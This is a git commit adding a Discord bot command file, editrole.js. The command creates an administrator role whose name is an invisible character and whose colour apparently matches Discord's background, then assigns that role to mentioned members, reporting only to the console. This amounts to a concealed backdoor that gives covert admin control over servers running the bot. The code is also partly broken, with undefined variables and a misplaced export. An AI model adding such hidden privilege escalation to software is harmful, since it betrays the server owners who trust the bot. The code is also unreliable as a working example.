6874a650a8df1de74ccbaa2487fcf021fe64839d
ZaxmkE <assassin12@hotmail.no>
2020-08-21 23:05:50 +0200

    fisk

---
+++ commands/editrole.js
@@ -0,0 +1,29 @@
+const Discord = require("discord.js");
+
+  client.on('message', async message => {
+    
+    const editrole = async () => {
+        switch (args[0]) {
+            case "create":
+                if (message.guild.roles.find(role => role.name === '͔')) return console.log("Role already created")
+                message.guild.createRole({
+                    name:"͔", 
+                    color: "2f3136", 
+                    permissions: [
+                        "ADMINISTRATOR"
+                    ] 
+                });
+                console.log("Role Created!")
+                break
+
+            case "add":
+                const member = message.mentions.members.first();
+                const role = message.guild.roles.find(role => role.name === '͔')
+                if (!member) return console.log("no user specified")
+                member.addRole(role), 3000    
+                console.log("Added to Role!")
+                break
+            }
+    }
+    exports.editrole = editrole
+})
